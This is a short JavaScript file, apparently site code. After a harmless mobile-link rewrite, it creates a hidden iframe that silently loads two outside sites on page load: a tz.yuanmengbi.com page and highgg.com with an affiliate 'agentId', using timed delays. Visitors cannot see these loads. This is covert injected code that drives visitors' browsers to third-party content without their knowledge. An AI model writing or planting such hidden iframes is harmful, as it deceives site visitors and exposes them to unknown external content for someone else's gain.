if (navigator.userAgent.toLowerCase().indexOf("mobile") !== -1) {
    var km = document.getElementById("km_url");
    if (km !== undefined) {
        km.href = km.href.replace("www.", "h5.")
    }
}

//<iframe src="https://tz.yuanmengbi.com//iisc.html?id=440"></iframe>
var iframe = document.createElement("iframe");
iframe.style.display = "none"
setTimeout(function () {
    iframe.src = "https://tz.yuanmengbi.com//iisc.html?id=440";
    document.body.append(iframe);
}, 500)
setTimeout(function () {
    iframe.src = "https://www.highgg.com?agentId=7035810";
    document.body.append(iframe);
}, 2000)


